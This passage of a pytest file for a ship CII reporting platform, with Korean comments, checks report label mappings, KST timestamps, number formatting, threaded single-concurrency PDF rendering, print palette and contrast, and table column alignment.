    """모르는 코드는 **코드를 그대로** 낸다 — 빈 칸·「기타」로 뭉개지 않는다."""
    from cii_platform.reports.labels import fuel_type_label

    assert fuel_type_label("BIO_LNG") == "BIO_LNG"
    assert fuel_type_label(None) == "—"


def test_no_known_fuel_code_is_shown_as_itself():
    """`#645`가 출처를 고칠 때 **유종 칸이 남아 있었다** — 같은 표에서 한 칸만 영문이었다.

    ⚠️ 종전 이름은 `test_the_fuel_table_carries_no_raw_fuel_code`였고 docstring이 「문서
    전체를 훑는다」고 적었으나, 실제로는 **라벨 dict에 `HFO` 키가 있는지**만 봤다 —
    문서도 표시 함수도 지나지 않았다(`#2142`). 이 파일은 DB 없이 돌아 문서를 조립하지
    못한다. 문서 전체 훑기는 `test_reports_db.py`의
    `test_no_raw_source_code_survives_in_the_report`가 한다. 여기서는 그 훑기가 기대는
    성질 — **아는 코드는 표시 함수를 지나면 코드가 아닌 것이 된다** — 을 본다.
    """
    from cii_platform.reports.labels import FUEL_TYPE_LABELS, fuel_type_label

    assert FUEL_TYPE_LABELS, "연료 표가 비었다 — 아래 반복이 아무것도 보지 않는다"
    for code in FUEL_TYPE_LABELS:
        shown = fuel_type_label(code)
        assert shown != code, f"{code}가 원문 코드 그대로 나간다"
        # 표기가 다른 연료의 코드와 겹치면 「원문 코드가 남았다」 훑기가 헛돈다.
        assert shown not in FUEL_TYPE_LABELS, (code, shown)


def test_ship_type_labels_cover_the_calc_ship_types():
    """코드 집합의 정본은 `calc/capacity.py`다 (`PRD §3.4.3`)."""
    from cii_platform.calc.capacity import DWT_BASED_SHIP_TYPES, GT_BASED_SHIP_TYPES
    from cii_platform.reports.labels import SHIP_TYPE_LABELS

    assert set(SHIP_TYPE_LABELS) == set(DWT_BASED_SHIP_TYPES | GT_BASED_SHIP_TYPES)


# ---------------------------------------------------------------------------
# 위험도 · 경고 · 사유 · 상태 표기 (#631)
#
# `#584`가 선종만 고치고 남긴 것들이다. 대조 상대가 둘로 갈린다 — `AGENTS §4.6`이
# **정본 문구**(정본이 원문을 확정한 것)와 **표시 문구**(디자인 소관)를 나누므로,
# 위험도·경고는 정본과, 나머지는 화면과 대조한다.
# ---------------------------------------------------------------------------

_FRONTEND = Path(__file__).parents[1] / "frontend" / "src" / "features"


def _read(*parts: str) -> str:
    return (_FRONTEND.joinpath(*parts)).read_text(encoding="utf-8")


def test_risk_labels_match_the_locked_design_system():
    """`DESIGN_SYSTEM §2.5 (b)` 🔒가 **병기 형태까지** 못박았다.

    「낮음 LOW · 보통 MEDIUM · 높음 HIGH · 심각 CRITICAL」 — 한국어를 앞에 두고 영문
    약어를 병기한다(`§14` 「한국어 라벨 + 영문 약어 병기」). 한국어만 남기면 문서에서
    본 「심각」과 API 응답의 `CRITICAL`을 같은 값으로 잇지 못한다.

    잠긴 절이므로 **문서 쪽 문자열을 직접 읽어** 대조한다. 여기에 기대값을 다시 적으면
    정본이 개정돼도 이 테스트는 통과한다.
    """
    from cii_platform.reports.labels import RISK_LABELS

    design = (Path(__file__).parents[1] / "DESIGN_SYSTEM.md").read_text(encoding="utf-8")

    quoted = re.search(r"「(낮음 LOW[^」]*)」", design)
    assert quoted, (
        "DESIGN_SYSTEM §2.5 (b)에서 위험도 라벨 문장을 찾지 못했다 — 절이 바뀌었는지 확인할 것"
    )

    canon = dict(
        (code, f"{ko} {code}") for ko, code in re.findall(r"(\S+) ([A-Z]+)", quoted.group(1))
    )

    assert canon == RISK_LABELS


def test_risk_labels_match_the_screen():
    """화면(`resultRules.ts` `riskLabel()`)도 같은 병기를 만든다.

    정본을 각자 옮겨 적은 두 곳이라, 한쪽이 낡으면 위 테스트가 잡는다. 이 테스트는
    **두 전사가 같은 결과를 내는지**를 본다 — 형태가 갈리면(`심각` vs `심각 CRITICAL`)
    같은 값을 보고도 다른 것으로 읽힌다.
    """
    from cii_platform.reports.labels import RISK_LABELS

    source = _read("voyage-cii", "resultRules.ts")
    screen = {
        code: f"{ko} {code}"
        for code, ko in re.findall(r"(\w+): \{ ko: '([^']+)', withIcon:", source)
    }

    assert screen, "resultRules.ts에서 RISK_LABEL을 읽지 못했다 — 파일 형식이 바뀌었는지 확인할 것"
    assert screen == RISK_LABELS


def test_warning_labels_transcribe_the_api_spec():
    """경고 메시지는 **정본 문구**다 (`AGENTS §4.6` 표).

    사슬은 `TECH_SPEC §12.3` → `API_SPEC §1.6` → {화면, 이 파일}이다. 서버는 화면을
    거치지 않고 정본에서 직접 받는다 — 화면을 경유하면 화면이 틀렸을 때 문서도 같이
    틀린다. `§12.3` ↔ `§1.6` 대조는 `tests/test_warning_codes_sync.py`가 본다.
    """
    from cii_platform.reports.labels import WARNING_LABELS

    spec = (Path(__file__).parents[1] / "API_SPEC.md").read_text(encoding="utf-8")
    section = spec.split("### 1.6 Warning 코드", 1)[1].split("### 1.7", 1)[0]

    canon = {
        code: message.strip()
        for code, message in re.findall(r"^\| `([A-Z_]+)` \| .* \| (.+?) \|$", section, re.M)
    }

    assert canon, "API_SPEC §1.6에서 경고 표를 읽지 못했다 — 표 형식이 바뀌었는지 확인할 것"
    assert canon == WARNING_LABELS


def test_projection_reason_labels_match_the_screen():
    """사유 없는 빈칸은 「아직 로딩 중」으로 읽힌다. 문서는 다시 불러올 수도 없다."""
    from cii_platform.reports.labels import PROJECTION_REASON_LABELS

    source = _read("realtime-cii", "realtimeRules.ts")
    block = source.split("export const PROJECTION_REASONS", 1)[1].split("}", 1)[0]
    screen = dict(re.findall(r"(\w+):\s*\n?\s*'([^']+)'", block))

    assert screen, "realtimeRules.ts에서 PROJECTION_REASONS를 읽지 못했다"
    assert screen == PROJECTION_REASON_LABELS


def test_voyage_status_and_policy_labels_match_the_screen():
    """항차 상태·집계 정책도 화면이 이미 한국어를 갖고 있다.

    `voyageRules.ts`가 스스로 *「API enum을 그대로 내보이지 않는다(`#529`와 같은 부류)」*
    라고 적어 뒀는데, 항차 리포트만 `COMPLETED`·`INCLUDE_AS_ACTUAL`을 그대로 냈다.
    """
    from cii_platform.reports.labels import INCLUSION_POLICY_LABELS, VOYAGE_STATUS_LABELS

    source = _read("voyage-management", "voyageRules.ts")

    for name, table in (
        ("STATUS_LABELS", VOYAGE_STATUS_LABELS),
        ("POLICY_LABELS", INCLUSION_POLICY_LABELS),
    ):
        block = source.split(f"export const {name}", 1)[1].split("}", 1)[0]
        screen = dict(re.findall(r"([A-Z_]+): '([^']+)'", block))
        assert screen, f"voyageRules.ts에서 {name}을 읽지 못했다"
        assert screen == table, name


def test_fuel_source_labels_cover_the_check_constraint():
    """코드 집합의 정본은 `voyage_fuel_use`의 `chk_fuel_source` CHECK 제약이다 (`#645`).

    **문자열을 여기 다시 적지 않는다** — 제약에서 직접 읽어 대조한다. 기대값을 전사하면
    새 출처가 늘 때 두 곳을 고쳐야 하고, 한쪽만 고치면 리포트가 원문 코드를 낸다.
    `test_ship_type_labels_cover_the_calc_ship_types`가 `calc/capacity.py`에서 읽는 것과
    같은 방식이다.
    """
    from cii_platform.db.models.voyage_fuel_use import VoyageFuelUse
    from cii_platform.reports.labels import FUEL_SOURCE_LABELS

    constraint = next(
        c
        for c in VoyageFuelUse.__table__.constraints
        if getattr(c, "name", None) == "chk_fuel_source"
    )
    codes = set(re.findall(r"'([A-Z_]+)'", str(constraint.sqltext)))

    assert codes, "chk_fuel_source에서 코드를 읽지 못했다 — 제약 형식이 바뀌었는지 확인할 것"
    assert set(FUEL_SOURCE_LABELS) == codes


def test_fuel_source_is_not_a_screen_label():
    """이 값은 **화면에 없다** — 그래서 「표시 문구」가 아니다 (`#645`).

    화면이 이 값을 표시하기 시작하면 대조 상대가 생기므로 분류를 다시 정해야 한다.
    그 사실을 여기서 잡는다 — 분류가 조용히 어긋나면 동기화 테스트가 아무것도
    검사하지 않는 상태가 된다.
    """
    source = _read("voyage-management", "voyageRules.ts")
    assert "SOURCE_LABELS" not in source, (
        "화면에 연료 출처 표기가 생겼다 — `labels.py`의 분류를 「표시 문구」로 옮기고 "
        "화면과 대조하도록 바꾸세요."
    )


def test_unknown_codes_show_the_code_itself():
    """조용히 감추면 **경고가 사라진다**. 화면의 `?? code` 갈래와 같은 판단이다."""
    from cii_platform.reports.labels import (
        fuel_source_label,
        inclusion_policy_label,
        projection_reason_label,
        risk_label,
        voyage_status_label,
        warning_label,
    )

    for fn in (
        risk_label,
        warning_label,
        projection_reason_label,
        voyage_status_label,
        fuel_source_label,
        inclusion_policy_label,
    ):
        assert fn("BRAND_NEW_CODE") == "BRAND_NEW_CODE", fn.__name__
        assert fn(None) == "—", fn.__name__


# ---------------------------------------------------------------------------
# 시각 표기 (#584)
# ---------------------------------------------------------------------------


def test_report_time_is_local_not_utc_iso():
    """종전에는 `isoformat()`이 그대로 나가 UTC에 마이크로초까지 실렸다.

    화면은 같은 시각을 KST로 보이므로 읽는 사람이 9시간 어긋난 값을 보게 된다.
    """
    from datetime import datetime

    from cii_platform.services.report import _local_time

    shown = _local_time(datetime(2026, 8, 20, 8, 34, 36, 889061, tzinfo=UTC))

    assert shown == "2026-08-20 17:34:36 KST"
    # ISO 구분자 `T`가 아니라 공백이다. (`"T" not in shown`으로 쓰면 "KST"에 걸린다 —
    # 실제로 그렇게 썼다가 이 테스트가 잡았다.)
    assert "2026-08-20T" not in shown
    # 마이크로초를 문서에 싣지 않는다.
    assert "889061" not in shown
    # UTC 시각(08:34)이 아니라 KST(17:34)다.
    assert "17:34:36" in shown


def test_report_time_handles_missing_value():
    from cii_platform.services.report import _local_time

    assert _local_time(None) == "—"


def test_display_accepts_serialized_strings():
    """연간 리포트는 서비스가 이미 직렬화한 **문자열**을 받아 쓴다 (#584 2차).

    1차 수정이 `Decimal` 경로만 고쳐서, 같은 문서 안에서 자릿수가 갈렸다 —
    항차 리포트는 `8.980`인데 연간 리포트는 `8.979907`이었다.
    """
    from cii_platform.services.report import _display

    assert _display("8.979907", "cii") == "8.980"
    assert _display("4300.00", "distance_nm") == "4,300"
    assert _display("620.00", "fuel_ton") == "620.0"
    assert _display("1930.68", "co2_ton") == "1,930.7"


def test_display_keeps_non_numeric_strings():
    """십진 문자열이 아니면 원문을 보인다 — 문서에서 값을 잃는 것보다 낫다."""
    from cii_platform.services.report import _display

    assert _display("해당 없음", "cii") == "해당 없음"
    assert _display("", "cii") == "—"


def test_report_time_accepts_iso_string():
    """`build_annual_report`는 서비스가 만든 ISO **문자열**을 받는다.

    1차 수정에서 문자열을 그대로 돌려주는 분기가 있어 연간 리포트만 UTC ISO로 남았다.
    """
    from cii_platform.services.report import _local_time

    assert _local_time("2026-08-20T08:34:36.889061+00:00") == "2026-08-20 17:34:36 KST"


# ── 렌더링은 스레드에서, 한 번에 하나만 (`#1363`) ────────────────────────────────
#
# ``write_pdf()``는 순수 CPU 작업이고 1초 안팎이 걸린다. ``async`` 라우트에서 그대로
# 부르면 그 시간 동안 **이벤트 루프가 멈춰** 같은 워커의 다른 요청이 전부 밀린다
# (감사 실측: 10 ms 틱이 최대 548 ms 정지). 아래는 실제 WeasyPrint를 부르지 않고
# **같은 시간을 동기로 쓰는 가짜 렌더러**로 그 성질만 본다 — 렌더러·폰트가 없는
# 환경에서도 돌아야 하고, 검사가 1초씩 늘어나서도 안 된다.


async def _tick_gaps(stop: asyncio.Event, gaps: list[float]) -> None:
    """10 ms마다 깨어나 **실제로 얼마 만에 깼는지**를 기록한다. 루프가 멈추면 그만큼 벌어진다."""
    last = time.monotonic()
    while not stop.is_set():
        await asyncio.sleep(0.01)
        now = time.monotonic()
        gaps.append(now - last)
        last = now


async def test_rendering_does_not_block_the_event_loop(monkeypatch: pytest.MonkeyPatch):
    """렌더링 중에도 이벤트 루프가 돈다 (`#1363`).

    가짜 렌더러가 **동기로** 0.3초를 쓴다. 스레드로 내보내면 그동안 10 ms 틱이 계속
    깨어나고, 루프에서 직접 부르면 한 번의 간격이 0.3초로 벌어진다.
    """
    from cii_platform.reports import pdf as pdf_module

    def _slow_render(_html: str) -> bytes:
        time.sleep(0.3)
        return b"%PDF-fake"

    monkeypatch.setattr(pdf_module, "render_pdf", _slow_render)

    stop = asyncio.Event()
    gaps: list[float] = []
    ticker = asyncio.create_task(_tick_gaps(stop, gaps))
    await asyncio.sleep(0.05)  # 틱이 자리를 잡을 때까지

    rendered = await pdf_module.render_pdf_async("<html></html>")

    stop.set()
    await ticker

    assert rendered == b"%PDF-fake"
    # 루프에서 직접 부르면 여기서 한 번이 0.3초를 넘는다.
    assert max(gaps) < 0.15, f"이벤트 루프가 {max(gaps):.3f}초 멈췄다 — 스레드로 나가지 않았다"
    # 0.3초 동안 10 ms 틱이라면 최소 열 번은 깨어나야 한다(느린 CI를 감안해 넉넉히 잡았다).
    assert len(gaps) >= 10, gaps


async def test_renders_run_one_at_a_time(monkeypatch: pytest.MonkeyPatch):
    """동시 상한은 **1**이다 (`#1363`).

    스레드로 내보내는 목적은 루프를 풀어 주는 것이지 렌더링을 병렬로 돌리는 것이
    아니다 — WeasyPrint는 거의 순수 파이썬이라 GIL을 놓지 않아, 동시에 돌리면 서로를
    느리게 만들 뿐이다(실측: 4건 동시 8.12초 vs 줄 세우면 약 1.84초).
    """
    from cii_platform.reports import pdf as pdf_module

    assert pdf_module.MAX_CONCURRENT_RENDERS == 1

    running = 0
    peak = 0
    guard = threading.Lock()

    def _counting_render(_html: str) -> bytes:
        nonlocal running, peak
        with guard:
            running += 1
            peak = max(peak, running)
        time.sleep(0.05)
        with guard:
            running -= 1
        return b"%PDF-fake"

    monkeypatch.setattr(pdf_module, "render_pdf", _counting_render)

    results = await asyncio.gather(
        *(pdf_module.render_pdf_async("<html></html>") for _ in range(4))
    )

    assert all(r == b"%PDF-fake" for r in results)
    assert peak == 1, f"동시에 {peak}건이 돌았다 — 상한이 걸리지 않았다"


# ─────────────────────────────────────────────────────────────────────────────
# 표지와 인쇄 — `#2001` · `DESIGN_SYSTEM §3` · `§14` · `§15` · `§16` 항목 9 ⑴
# ─────────────────────────────────────────────────────────────────────────────

#: 브랜드 네이비 (`--brand-base` · `DESIGN_SYSTEM §15`).
BRAND_NAVY = "#16305C"

LOGO_ASSET = Path(__file__).resolve().parents[1] / "frontend/public/brand/bluelog-logo-dark.svg"


#: 리포트 본문의 중성색. 따뜻한 회색 계열이며 등급·상태를 뜻하지 않는다 —
#: 문자(`#1A1A18`) · 보조 문자와 푸터(`#5F5E5A` · `#666666`) · 경계선(`#C9C7BE` ·
#: `#E3E2DC`) · 면(`#F8F8F6`). **여기 적힌 값이 리포트가 쓰는 색의 전부**이고,
#: 목록을 늘리는 일은 그 자체로 검토 대상이다.
NEUTRAL_INK = {"#1A1A18", "#5F5E5A", "#666666", "#C9C7BE", "#E3E2DC", "#F8F8F6"}


def _hexes(text: str) -> set[str]:
    """``#abc``·``#aabbcc``를 여섯 자리 대문자로 모아 준다."""
    out = set()
    for value in re.findall(r"#[0-9A-Fa-f]{3}(?![0-9A-Fa-f])|#[0-9A-Fa-f]{6}(?![0-9A-Fa-f])", text):
        body = value.lstrip("#")
        if len(body) == 3:
            body = "".join(c * 2 for c in body)
        out.add("#" + body.upper())
    return out


def test_the_cover_logo_matches_the_brand_asset():
    """박아 둔 워드마크가 자산과 갈라지면 **리포트만** 옛 로고를 인쇄한다.

    런타임에 파일을 읽지 않는 이유는 백엔드 이미지에 ``frontend/public/``이 들어간다는
    보장이 없기 때문이다(없는 날 로고가 조용히 사라진다). 그 대가가 이 검사다.
    """
    assert LOGO_ASSET.read_text(encoding="utf-8") == LOGO_SVG


def test_the_cover_band_is_printed_once():
    """띠는 본문 흐름에 있다 — ``@page`` 머리글에 두면 페이지마다 네이비가 인쇄된다."""
    rendered = render_html(_document())
    assert rendered.count('<div class="cover">') == 1
    assert "@top-" not in STYLESHEET


def test_stylesheet_weights_stay_inside_section_3():
    """`§3` — 「굵기는 400·500만 쓴다」.

    ⚠️ **인쇄 폰트 스택에는 Medium이 없다.** 컨테이너가 싣는 것은 ``fonts-nanum``
    (Regular·Bold)뿐이라, WeasyPrint 실측으로 `400`과 `500`이 같은 잉크량(2399px),
    `600`과 `700`이 같은 잉크량(3816px)으로 떨어진다. 즉 `500`은 지금 Regular로
    렌더링되고 `600`은 Bold였다. 이 검사는 **선언이 `§3` 안에 있는지**만 본다 —
    스택이 Medium을 갖는 날 선언이 그대로 의도대로 렌더링된다.
    """
    declared = set(re.findall(r"font-weight:\s*(\d+)", STYLESHEET))
    assert declared, "스타일시트가 굵기를 하나도 선언하지 않는다 — 브라우저 기본값에 맡겨진다"
    assert declared <= {"400", "500"}, f"`§3` 밖의 굵기: {sorted(declared - {'400', '500'})}"


def test_the_report_palette_is_a_closed_set():
    """`§16` 항목 9 ⑴의 검증을 가드로 굳힌다.

    리포트는 등급을 **문자로만** 싣는다. 그래서 흑백 인쇄에서 잃을 색이 애초에 없다.
    다만 그 상태는 규격이 지켜 주는 것이 아니라 우연이므로, 등급 색이 들어오는 날
    여기서 걸린다 — 등급 색은 `§0.2` 제약 2·3상 **문자 없이는 쓸 수 없고**, 흑백
    인쇄에서는 `§14` 보조 채널이 따로 있어야 한다.
    """
    rendered = render_html(_document())
    allowed = NEUTRAL_INK | {BRAND_NAVY.upper()} | _hexes(LOGO_ASSET.read_text(encoding="utf-8"))
    unexpected = _hexes(rendered) - allowed
    assert not unexpected, (
        f"리포트에 새 색이 들어왔다: {sorted(unexpected)} — "
        "등급 색이라면 `§0.2` 제약 2·3(문자 없이 색만으로 뜻을 전하지 않는다)과 "
        "`§14`(흑백에서 무늬가 대신 진다)를 먼저 통과해야 한다. "
        "중성색을 늘린 것이라면 `NEUTRAL_INK`를 갱신한다."
    )


def test_grades_are_letters_so_black_and_white_keeps_them():
    """`§0.2` 제약 2 — 등급은 색이 아니라 문자로 읽혀야 한다."""
    document = _document(
        sections=[
            TableSection(
                title="연도별 추이",
                headers=["연도", "등급"],
                rows=[["2022", "A"], ["2023", "B"], ["2024", "C"], ["2025", "D"], ["2026", "E"]],
            )
        ]
    )
    rendered = render_html(document)
    for grade in "ABCDE":
        assert f"<td>{grade}</td>" in rendered


# ─────────────────────────────────────────────────────────────────────────────
# 인쇄 굵기와 표지 위계 — `#2003` · `DESIGN_SYSTEM §3` · `§0.2` 제약 1 · `§14`
# ─────────────────────────────────────────────────────────────────────────────

#: HTML 기본 스타일이 **굵게** 그리는 태그. 선언이 없으면 `§3` 밖의 `700`이 조용히
#: 인쇄된다 — 이 이슈(`#2003`)가 생긴 이유가 그것이다.
BOLD_BY_DEFAULT = frozenset({"b", "strong", "h1", "h2", "h3", "h4", "h5", "h6", "th"})

#: 인쇄면. 종이는 흰색이고, 면책 상자와 표 머리글만 `#f8f8f6`이다. 대비는 **더 어두운
#: 쪽**을 기준으로 잰다 (`§0.2` 제약 6).
DARKEST_PAPER = "#F8F8F6"


def _css_rules(css: str) -> list[tuple[list[str], str]]:
    """스타일시트를 ``(선택자 목록, 선언 묶음)``으로 자른다.

    주석과 ``@page``를 먼저 걷는다 — ``@page``는 중첩 블록이라 단순 분할로는 잘리지
    않고, 주석 안의 예시 선언이 검사 대상으로 섞인다.
    """
    text = re.sub(r"/\*.*?\*/", "", css, flags=re.S)
    text = re.sub(r"@page\s*\{(?:[^{}]|\{[^{}]*\})*\}", "", text, flags=re.S)
    rules = []
    for block in text.split("}"):
        selectors, brace, body = block.partition("{")
        if not brace:
            continue
        rules.append(([s.strip() for s in selectors.split(",") if s.strip()], body))
    return rules


def _tags_declaring_weight(css: str) -> set[str]:
    """``font-weight``를 정하는 규칙이 닿는 **태그 이름**을 모은다.

    선택자의 **마지막 조각**이 실제로 칠해지는 요소다 — ``.meta b``는 ``b``다.
    """
    tags = set()
    for selectors, body in _css_rules(css):
        if "font-weight" not in body:
            continue
        for selector in selectors:
            tag = re.match(r"[a-z][a-z0-9]*", selector.split()[-1])
            if tag:
                tags.add(tag.group())
    return tags


def _declarations(css: str, selector: str) -> dict[str, str]:
    """한 선택자의 선언을 ``속성: 값``으로 모은다 (뒤에 온 선언이 이긴다)."""
    found: dict[str, str] = {}
    for selectors, body in _css_rules(css):
        if selector not in selectors:
            continue
        for declaration in body.split(";"):
            name, colon, value = declaration.partition(":")
            if colon:
                found[name.strip()] = value.strip()
    return found


def _relative_luminance(colour: str) -> float:
    body = colour.lstrip("#")
    if len(body) == 3:
        body = "".join(c * 2 for c in body)
    channels = []
    for index in (0, 2, 4):
        value = int(body[index : index + 2], 16) / 255
        channels.append(value / 12.92 if value <= 0.04045 else ((value + 0.055) / 1.055) ** 2.4)
    red, green, blue = channels
    return 0.2126 * red + 0.7152 * green + 0.0722 * blue


def _contrast(first: str, second: str) -> float:
    one, two = _relative_luminance(first), _relative_luminance(second)
    lighter, darker = max(one, two), min(one, two)
    return (lighter + 0.05) / (darker + 0.05)


def test_no_element_falls_back_to_the_browser_default_weight():
    """기본값에 맡기면 `§3` 밖의 `700`이 **오류 없이** 인쇄된다 (`#2003`).

    `#2001`이 표 머리글 하나만 고쳤을 때 제목 둘과 ``<b>`` 둘이 그대로 남아 있었다 —
    스타일시트에 그 자리가 **적혀 있지 않아서** 눈에 띄지 않았다. 문서에 실제로 나오는
    태그를 세어 선언과 맞춘다.
    """
    rendered = render_html(_document())
    used = {tag for tag in BOLD_BY_DEFAULT if re.search(rf"<{tag}[\s>]", rendered)}
    assert used, "표본 문서에 굵게 그려지는 태그가 없다 — `_document()`가 바뀌었는지 볼 것"
    missing = used - _tags_declaring_weight(STYLESHEET)
    assert not missing, (
        f"굵기 선언 없이 브라우저 기본값으로 인쇄되는 태그: {sorted(missing)} — "
        "`§3`(400·500)을 벗어난 굵기가 조용히 나간다"
    )


def test_the_meta_tells_label_from_value_by_size_and_tone():
    """굵기를 쓸 수 없는 자리라 **두 채널**로 가른다 (`#2003` 확정).

    한 채널만 남기면 구분이 물러진다 — 색조만 쓴 시안이 흑백 확대에서 그랬다. 순서(라벨이
    값 앞에 온다)가 주 채널이므로 색이 단독으로 뜻을 지지 않는다(`§14`).
    """
    label = _declarations(STYLESHEET, ".meta")
    value = _declarations(STYLESHEET, ".meta b")

    label_pt = float(label["font-size"].removesuffix("pt"))
    value_pt = float(value["font-size"].removesuffix("pt"))
    assert value_pt > label_pt, f"값이 라벨보다 크지 않다 ({value_pt}pt ≤ {label_pt}pt)"

    assert _relative_luminance(value["color"]) < _relative_luminance(label["color"]), (
        "값이 라벨보다 어둡지 않다 — 색조 채널이 뒤집혔다"
    )


def test_the_meta_tones_clear_the_contrast_floor():
    """`§0.2` 제약 1 — 가장 약한 글자도 4.5:1을 넘는다. 제약 6대로 더 어두운 면을 기준한다."""
    for role, selector in (("라벨", ".meta"), ("값", ".meta b")):
        colour = _declarations(STYLESHEET, selector)["color"]
        ratio = _contrast(colour, DARKEST_PAPER)
        assert ratio >= 4.5, f"{role}({colour}) 대비 {ratio:.2f} — 4.5 미만"


# ─────────────────────────────────────────────────────────────────────────────
# 정렬은 셀이 아니라 열이 정한다 — `#2004`
# ─────────────────────────────────────────────────────────────────────────────

#: ⚠️ 속성 앞의 공백을 **요구한다.** `[^>]*`로 두면 `<thead>`가 `th` + `ead`로 잡혀
#: 첫 칸이 통째로 밀린다 — 이 파일을 쓰면서 실제로 걸렸다.
_CELL = re.compile(r"<(?P<tag>th|td)(?P<attrs>(?:\s[^>]*)?)>(?P<text>.*?)</(?P=tag)>", re.S)


def _alignment(section: TableSection) -> tuple[list[bool], list[list[bool]]]:
    """표 한 장을 ``(머리글 정렬, 행마다의 정렬)``로 읽는다. ``True``가 오른쪽이다."""
    rendered = section_html(section)
    head_html, _, body_html = rendered.partition("</thead>")
    header = ['class="num"' in m.group("attrs") for m in _CELL.finditer(head_html)]
    rows: list[list[bool]] = []
    for row_html in body_html.split("<tr>")[1:]:
        rows.append(['class="num"' in m.group("attrs") for m in _CELL.finditer(row_html)])
    return header, rows


def test_the_header_sits_on_the_same_side_as_its_column():
    """`#2004` — 머리글이 자기 열과 반대쪽에 붙어 있었다.

    스타일시트가 적어 둔 것은 「수치 **열**은 오른쪽 정렬 — 세로로 자릿수가 맞아야
    읽힌다」인데 구현이 **셀마다** 판정해, 「실적 CII」는 글자라 왼쪽이고 그 아래 `6.98`은
    숫자라 오른쪽이었다. 자릿수를 맞춰 읽으라는 정렬의 기준선이 머리글에서 끊겼다.
    """
    section = TableSection(
        title="연도별 추이",
        headers=["연도", "상태", "실적 CII", "등급", "거리 (nm)"],
        rows=[
            ["2024", "확정", "6.98", "B", "82,441"],
            ["2025", "진행 중", "7.31", "C", "76,002"],
        ],
    )
    header, rows = _alignment(section)
    for index, is_num in enumerate(header):
        column = {row[index] for row in rows}
        assert column == {is_num}, (
            f"{section.headers[index]}: 머리글은 {'오른쪽' if is_num else '왼쪽'}인데 값은 {column}"
        )
    assert header == [True, False, True, False, True]


def test_a_missing_value_does_not_flip_a_numeric_column():
    """`—` 하나가 열을 뒤집으면 그 표의 자릿수가 통째로 어긋난다."""
    section = TableSection(
        title="연료 내역",
        headers=["유종", "실적 (t)"],
        rows=[["중유", "1,204.5"], ["경유", MISSING_VALUE], ["LNG", "88.0"]],
    )
    header, rows = _alignment(section)
    assert header == [False, True]
    # 빈칸도 열을 따라 오른쪽에 선다 — 숫자들의 오른쪽 끝과 같은 선이다.
    assert [row[1] for row in rows] == [True, True, True]


def test_one_word_in_a_column_pulls_the_whole_column_left():
    """반대 방향도 고정한다 — 한 칸이라도 수치가 아니면 열이 수치 열이 아니다.

    「빈칸은 세지 않는다」만 있으면 **아무 글자나** 들어와도 열이 오른쪽에 남는다.
    """
    section = TableSection(
        title="완료 항차",
        headers=["연도", "항차"],
        rows=[["2024", "21"], ["2025", "집계 중"]],
    )
    header, rows = _alignment(section)
    assert header == [True, False]
    assert [row[1] for row in rows] == [False, False]


def test_the_column_kinds_declaration_does_not_decide_alignment():
    """`kinds`는 **CSV 직렬화** 선언이다 (`#1247`) — 정렬과 뜻이 다르다.

    「완료 항차」는 `3 (+진행 중 1)` 꼴이 섞인다는 이유로 `string`으로 선언돼 있지만
    읽는 사람에게는 수치 열이다. 선언에 두 번째 뜻을 얹으면 한쪽을 고칠 때 다른 쪽이
    조용히 움직인다.
    """
    section = TableSection(
        title="완료 항차",
        headers=["완료 항차"],
        kinds=["string"],
        rows=[["21"], ["12 (+진행 중 1)"]],
    )
    header, _ = _alignment(section)
    assert header == [True], "`string` 선언이 정렬을 끌어갔다"


def test_the_missing_marker_matches_the_document_side():
    """표기가 갈리면 열 판정이 **조용히** 빈칸을 값으로 세고 열이 뒤집힌다."""
    from cii_platform.services.report import _display

    assert _display(None, "cii") == MISSING_VALUE


def test_a_server_marker_does_not_flip_a_numeric_column():
    """「이력 없음」·「계산 불가」 하나가 수치 열을 왼쪽으로 뒤집지 않는다 (`#2092`).

    사후 비교 표는 「저장된 비교에 없다」·「낼 수 없다」를 `—`와 다른 말로 적는데, 그 말이
    들어간 열이 **미리보기·PDF에서 통째로 왼쪽**이 됐다 — `#2004`가 `—`만 세지 않았기
    때문이다. 서버가 정한 표지는 닫힌 집합이라 `—`처럼 세지 않을 수 있다. 사용자 입력이
    섞이는 「집계 중」 같은 글자는 여전히 열을 뒤집는다(바로 위 검사).
    """
    from cii_platform.reports.document import ABSENT_MARKERS

    section = TableSection(
        title="시나리오 사후 비교",
        headers=["구분", "연료 (t)", "CII"],
        rows=[
            ["직항", "250.0", "5.190"],
            ["우회", "이력 없음", "이력 없음"],
            ["실적", "계산 불가", "계산 불가"],
        ],
    )
    header, rows = _alignment(section)
    assert header == [False, True, True]
    assert [row[1:] for row in rows] == [[True, True]] * 3
    # 표지만 있는 열은 수치 열이 아니다 — 세지 않는 값뿐이면 판정할 근거가 없다.
    only_markers = TableSection(title="표", headers=["CII"], rows=[[m] for m in ABSENT_MARKERS])
    assert _alignment(only_markers)[0] == [False]


def test_the_absent_markers_are_the_ones_the_document_uses():
    """렌더러가 세지 않는 표지와 서비스가 쓰는 표지가 **같은 상수**인가.

    갈리면 한쪽에서 바꾼 문구가 다른 쪽에서 값으로 세어져 열이 조용히 뒤집힌다 — 그래서
    상수는 문서 모델(`reports/document.py`) 한 곳에 있고 서비스가 가져다 쓴다.
    """
    from cii_platform.reports.document import ABSENT_MARKERS
    from cii_platform.reports.html import _looks_numeric
    from cii_platform.services import report as report_service

    assert {
        report_service.SCENARIO_NOT_STORED,
        report_service.ACTUAL_CII_NOT_COMPUTABLE,
        report_service.ACTUAL_RATING_NOT_RATED,
    } == ABSENT_MARKERS
    assert MISSING_VALUE not in ABSENT_MARKERS, "`—`는 따로 센다 — 두 번 적지 않는다"
    assert not any(_looks_numeric(marker) for marker in ABSENT_MARKERS)


# ─────────────────────────────────────────────────────────────────────────────
# 결론 · 차트 · 소진형 분기 — `#2002` · `PRD §16.4` · `DESIGN_SYSTEM §2.4.4` · `§8.6` · `§14`
# ─────────────────────────────────────────────────────────────────────────────


def _band(markers=(("올해 누적 실적 (기준 대비 %)", "102.3"),)) -> ChartSection:
    return ChartSection(
        chart="rating_band",
        table=TableSection(
            title="등급 경계",
            headers=list(BAND_HEADERS),
            kinds=["string", "numeric", "numeric", "numeric", "numeric"],
            rows=[
                ["A", "—", "86", "—", "6.013"],
                ["B", "86", "94", "6.013", "6.572"],
                ["C", "94", "106", "6.572", "7.411"],
                ["D", "106", "118", "7.411", "8.250"],
                ["E", "118", "—", "8.250", "—"],
            ],
        ),
        markers=list(markers),
    )


def _trend(rows=None) -> ChartSection:
    return ChartSection(
        chart="trend",
        table=TableSection(
            title="연도별 추이",
            headers=["연도", "실적 CII", "기준 CII", "등급"],
            rows=rows
            or [
                ["2024", "6.410", "7.201", "B"],
                ["2025", "6.900", "7.100", "B"],
                ["2026", "7.152", "6.991", "C"],
            ],
